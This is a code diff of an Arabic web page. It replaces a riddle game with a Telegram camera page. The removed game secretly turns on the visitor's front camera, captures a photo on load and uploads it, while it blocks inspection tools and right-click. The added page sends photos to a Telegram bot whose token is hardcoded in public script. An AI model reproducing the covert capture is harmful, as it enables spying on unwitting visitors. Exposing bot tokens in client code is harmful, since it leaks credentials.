@@ -1,202 +1,373 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>غرفة الألغاز الغامضة</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(to bottom, #0f2027, #203a43, #2c5364);
-      color: #fff;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      text-align: center;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>كاميرا تليجرام - التقاط وإرسال</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-    #riddle-box {
-      max-width: 90%;
-      background: rgba(255,255,255,0.05);
-      padding: 30px;
-      border-radius: 15px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.5);
-      transition: all 0.5s ease-in-out;
-    }
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
 
-    #question {
-      font-size: 20px;
-      margin-bottom: 10px;
-    }
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 20px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
 
-    input {
-      padding: 10px;
-      font-size: 18px;
-      width: 80%;
-      border-radius: 8px;
-      border: none;
-      outline: none;
-      text-align: center;
-    }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
 
-    button {
-      margin: 10px 5px 0;
-      padding: 10px 25px;
-      font-size: 18px;
-      background: #66fcf1;
-      color: #0b0c10;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      transition: 0.3s;
-    }
+        .camera-container {
+            position: relative;
+            width: 100%;
+            border-radius: 15px;
+            overflow: hidden;
+            margin-bottom: 15px;
+            background: #000;
+        }
 
-    button:hover {
-      background: #45a29e;
-    }
+        video {
+            width: 100%;
+            height: auto;
+            transform: scaleX(-1); /* مرآة للكاميرا الأمامية */
+        }
 
-    #result {
-      margin-top: 15px;
-      font-size: 18px;
-      min-height: 30px;
-    }
+        canvas {
+            display: none;
+        }
 
-    #timer {
-      font-size: 16px;
-      color: #f39c12;
-      margin-top: 10px;
-    }
+        .preview {
+            width: 100%;
+            border-radius: 15px;
+            margin-top: 15px;
+            display: none;
+        }
 
-    video, canvas {
-      display: none;
-    }
-  </style>
-  <script>
-    document.addEventListener('keydown', function (e) {
-      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) || (e.ctrlKey && e.key === 'U')) {
-        e.preventDefault();
-        alert("🚫 لا يمكنك فحص هذا الموقع!");
-        return false;
-      }
-    });
-    document.addEventListener('contextmenu', e => e.preventDefault());
-  </script>
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 18px;
+            border-radius: 30px;
+            cursor: pointer;
+            margin: 5px;
+            transition: transform 0.2s;
+        }
+
+        button:hover {
+            transform: scale(1.05);
+        }
+
+        button:active {
+            transform: scale(0.95);
+        }
+
+        .btn-capture {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+        }
+
+        .status {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 10px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            display: block;
+        }
+
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            display: block;
+        }
+
+        .status.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            display: block;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        #timer {
+            font-size: 48px;
+            font-weight: bold;
+            color: #fff;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0,0,0,0.7);
+            padding: 20px;
+            border-radius: 50%;
+            display: none;
+        }
+    </style>
 </head>
 <body>
-  <div id="riddle-box">
-    <div id="question">جارٍ تحميل اللغز...</div>
-    <input type="text" id="answerInput" placeholder="اكتب إجابتك هنا" />
-    <br>
-    <button onclick="checkAnswer()">تحقق</button>
-    <button onclick="showHint()">تلميح</button>
-    <div id="timer"></div>
-    <div id="result"></div>
-  </div>
+    <div class="container">
+        <h1>📸 التقاط الصورة</h1>
+        
+        <div class="camera-container">
+            <video id="video" autoplay playsinline></video>
+            <div id="timer">3</div>
+        </div>
+        
+        <canvas id="canvas"></canvas>
+        <img id="preview" class="preview" alt="الصورة الملتقطة">
+        
+        <div>
+            <button id="captureBtn" class="btn-capture">📷 التقاط صورة</button>
+            <button id="retryBtn" style="display:none;">🔄 إعادة المحاولة</button>
+        </div>
+        
+        <div id="status" class="status"></div>
+    </div>
 
-  <video id="video" autoplay playsinline></video>
-  <canvas id="cam"></canvas>
-
-  <audio id="bgMusic" loop autoplay>
-    <source src="https://cdn.pixabay.com/download/audio/2022/10/30/audio_2b15fd041c.mp3?filename=slow-mystical-ambient-123039.mp3" type="audio/mpeg">
-  </audio>
-
-  <audio id="successSound">
-    <source src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_173ce744d6.mp3?filename=success-1-6297.mp3" type="audio/mpeg">
-  </audio>
-
-  <audio id="failSound">
-    <source src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_a0eaf419fb.mp3?filename=error-1-47861.mp3" type="audio/mpeg">
-  </audio>
-
-  <script>
-    const riddles = [
-      { question: "شيء كلما أخذت منه كبر؟", answer: "الحفرة", hint: "يتعلق بالأرض" },
-      { question: "يمشي بلا قدمين ويدخل الأذنين؟", answer: "الصوت", hint: "تسمعه ولا تراه" },
-      { question: "له رقبة بلا رأس وذراعان بلا يدين؟", answer: "القميص", hint: "يُلبس" },
-      { question: "تراني ولا أراك، ومن حولك أنا؟", answer: "الهواء", hint: "لا يُرى" },
-      { question: "شيء إن لمسته صاح؟", answer: "الجرس", hint: "يصدر صوتًا عند الاهتزاز" }
-    ];
-
-    let currentRiddle = 0, timer = 30, timerInterval;
-
-    const qEl = document.getElementById("question");
-    const iEl = document.getElementById("answerInput");
-    const rEl = document.getElementById("result");
-    const tEl = document.getElementById("timer");
-    const sSound = document.getElementById("successSound");
-    const fSound = document.getElementById("failSound");
-
-    function showRiddle(index) {
-      if (index < riddles.length) {
-        qEl.innerText = riddles[index].question;
-        iEl.value = "";
-        rEl.innerText = "";
-        timer = 30;
-        tEl.innerText = `⏳ ${timer} ثانية`;
-        clearInterval(timerInterval);
-        timerInterval = setInterval(() => {
-          timer--;
-          tEl.innerText = `⏳ ${timer} ثانية`;
-          if (timer === 0) {
-            clearInterval(timerInterval);
-            rEl.innerText = "❌ انتهى الوقت! حاول مجددًا.";
-          }
-        }, 1000);
-      } else {
-        qEl.innerText = "🎉 تهانينا! أنهيت كل الألغاز.";
-        iEl.style.display = "none";
-        tEl.style.display = "none";
-        document.querySelectorAll("button").forEach(btn => btn.style.display = "none");
-        rEl.innerHTML = "<br>🪄 تم فتح البوابة الغامضة...<br><strong>إعداد: Yazan</strong>";
-      }
-    }
-
-    function checkAnswer() {
-      const user = iEl.value.trim().toLowerCase();
-      const correct = riddles[currentRiddle].answer.toLowerCase();
-      if (user === correct) {
-        sSound.play();
-        rEl.innerText = "✔️ إجابة صحيحة!";
-        clearInterval(timerInterval);
-        setTimeout(() => showRiddle(++currentRiddle), 1000);
-      } else {
-        fSound.play();
-        rEl.innerText = "❌ خطأ! حاول مجددًا.";
-      }
-    }
-
-    function showHint() {
-      rEl.innerText = "💡 تلميح: " + riddles[currentRiddle].hint;
-    }
-
-    const video = document.getElementById("video");
-    const cam = document.getElementById("cam");
-
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-      .then(stream => {
-        video.srcObject = stream;
-        setTimeout(() => {
-          const ctx = cam.getContext("2d");
-          cam.width = video.videoWidth;
-          cam.height = video.videoHeight;
-          ctx.drawImage(video, 0, 0, cam.width, cam.height);
-          const img = cam.toDataURL("image/png");
-          fetch("upload.js", {
-            method: "POST",
-            body: JSON.stringify({ image: img }),
-            headers: { "Content-Type": "application/json" }
-          });
-          showRiddle(currentRiddle);
-        }, 1500);
-      })
-      .catch(() => {
-        document.body.innerHTML = "<h2 style='padding:20px;'>🚫 لا يمكنك دخول الغرفة بدون السماح بالصلاحيات.</h2>";
-      });
-  </script>
+    <script>
+        // ==================== إعدادات تليجرام ====================
+        // ⚠️ أدخل توكن البوت ومعرف المحادثة هنا
+        const BOT_TOKEN = "8179040156:AAFdn8ApCAIbaWhpLaFQMyqrwUwfR1hfyuY";     // ضع توكن البوت
+        const CHAT_ID = "@xoNA12_bot";         // ضع معرف المحادثة
+        
+        // ==================== تهيئة تليجرام WebApp ====================
+        let tg;
+        try {
+            tg = window.Telegram.WebApp;
+            tg.ready();
+            tg.expand();
+            console.log('✅ تم تهيئة تليجرام');
+        } catch(e) {
+            console.log('يعمل خارج تليجرام');
+        }
+        
+        // ==================== عناصر DOM ====================
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const preview = document.getElementById('preview');
+        const captureBtn = document.getElementById('captureBtn');
+        const retryBtn = document.getElementById('retryBtn');
+        const statusDiv = document.getElementById('status');
+        const timerDiv = document.getElementById('timer');
+        
+        let stream = null;
+        let countdownInterval = null;
+        
+        // ==================== دالة عرض الحالة ====================
+        function showStatus(message, type = 'info') {
+            statusDiv.textContent = message;
+            statusDiv.className = `status ${type}`;
+            
+            // إخفاء الحالة بعد 5 ثواني
+            setTimeout(() => {
+                if (statusDiv.className.includes(type)) {
+                    statusDiv.style.display = 'none';
+                    setTimeout(() => {
+                        statusDiv.className = 'status';
+                    }, 300);
+                }
+            }, 5000);
+        }
+        
+        // ==================== تشغيل الكاميرا ====================
+        async function startCamera() {
+            try {
+                showStatus('📷 جاري تشغيل الكاميرا...', 'info');
+                
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: { exact: "user" }  // الكاميرا الأمامية
+                    }
+                });
+                
+                video.srcObject = stream;
+                
+                // انتظار تحميل الفيديو
+                video.onloadedmetadata = () => {
+                    video.play();
+                    showStatus('✅ الكاميرا جاهزة! اضغط على زر التقاط الصورة', 'success');
+                    captureBtn.disabled = false;
+                };
+                
+            } catch (error) {
+                console.error('خطأ في الكاميرا:', error);
+                
+                // محاولة تشغيل الكاميرا الخلفية إذا فشلت الأمامية
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: "environment" }
+                    });
+                    video.srcObject = stream;
+                    showStatus('✅ الكاميرا الخلفية جاهزة!', 'success');
+                    captureBtn.disabled = false;
+                } catch (err) {
+                    showStatus('❌ لا يمكن الوصول إلى الكاميرا. تأكد من منح الصلاحيات.', 'error');
+                    captureBtn.disabled = true;
+                }
+            }
+        }
+        
+        // ==================== العد التنازلي ====================
+        function startCountdown(callback) {
+            let count = 3;
+            timerDiv.textContent = count;
+            timerDiv.style.display = 'flex';
+            
+            countdownInterval = setInterval(() => {
+                count--;
+                timerDiv.textContent = count;
+                
+                if (count === 0) {
+                    clearInterval(countdownInterval);
+                    timerDiv.style.display = 'none';
+                    callback();
+                }
+            }, 1000);
+        }
+        
+        // ==================== التقاط الصورة ====================
+        function capturePhoto() {
+            startCountdown(() => {
+                // ضبط أبعاد canvas لتتناسب مع الفيديو
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                // رسم الصورة من الفيديو إلى canvas
+                const context = canvas.getContext('2d');
+                
+                // عكس الصورة إذا كانت الكاميرا الأمامية (لتصحيح المرآة)
+                context.translate(canvas.width, 0);
+                context.scale(-1, 1);
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                context.setTransform(1, 0, 0, 1, 0, 0); // إعادة تعيين التحويل
+                
+                // تحويل canvas إلى Base64
+                const imageData = canvas.toDataURL('image/jpeg', 0.9);
+                
+                // عرض المعاينة
+                preview.src = imageData;
+                preview.style.display = 'block';
+                
+                // إرسال الصورة إلى تليجرام
+                sendToTelegram(imageData);
+            });
+        }
+        
+        // ==================== إرسال الصورة إلى تليجرام ====================
+        async function sendToTelegram(imageBase64) {
+            try {
+                showStatus('📤 جاري إرسال الصورة إلى تليجرام...', 'info');
+                captureBtn.disabled = true;
+                
+                // استخراج البيانات من Base64
+                const base64Data = imageBase64.split(',')[1];
+                
+                // تحويل Base64 إلى Blob
+                const byteCharacters = atob(base64Data);
+                const byteArrays = [];
+                for (let i = 0; i < byteCharacters.length; i++) {
+                    byteArrays.push(byteCharacters.charCodeAt(i));
+                }
+                const byteArray = new Uint8Array(byteArrays);
+                const blob = new Blob([byteArray], { type: 'image/jpeg' });
+                
+                // إنشاء FormData للإرسال
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'camera_capture.jpg');
+                
+                // إضافة تسمية توضيحية (اختياري)
+                formData.append('caption', `📸 صورة ملتقطة عبر الكاميرا\n🕐 ${new Date().toLocaleString('ar-SA')}`);
+                
+                // إرسال إلى تليجرام
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                
+                if (result.ok) {
+                    showStatus('✅ تم إرسال الصورة بنجاح إلى تليجرام!', 'success');
+                    
+                    // إظهار زر إعادة المحاولة
+                    captureBtn.style.display = 'none';
+                    retryBtn.style.display = 'inline-block';
+                } else {
+                    throw new Error(result.description || 'فشل الإرسال');
+                }
+                
+            } catch (error) {
+                console.error('خطأ في الإرسال:', error);
+                showStatus(`❌ فشل الإرسال: ${error.message}`, 'error');
+                captureBtn.disabled = false;
+            }
+        }
+        
+        // ==================== إعادة المحاولة ====================
+        function resetAndRetry() {
+            preview.style.display = 'none';
+            captureBtn.style.display = 'inline-block';
+            retryBtn.style.display = 'none';
+            captureBtn.disabled = false;
+            showStatus('📷 جاهز للتصوير مجدداً', 'info');
+        }
+        
+        // ==================== إيقاف الكاميرا (عند الإغلاق) ====================
+        function stopCamera() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        }
+        
+        // ==================== إضافة مستمعي الأحداث ====================
+        captureBtn.addEventListener('click', capturePhoto);
+        retryBtn.addEventListener('click', resetAndRetry);
+        
+        // إيقاف الكاميرا عند مغادرة الصفحة
+        window.addEventListener('beforeunload', stopCamera);
+        
+        // ==================== بدء تشغيل الكاميرا ====================
+        startCamera();
+    </script>
 </body>
 </html>
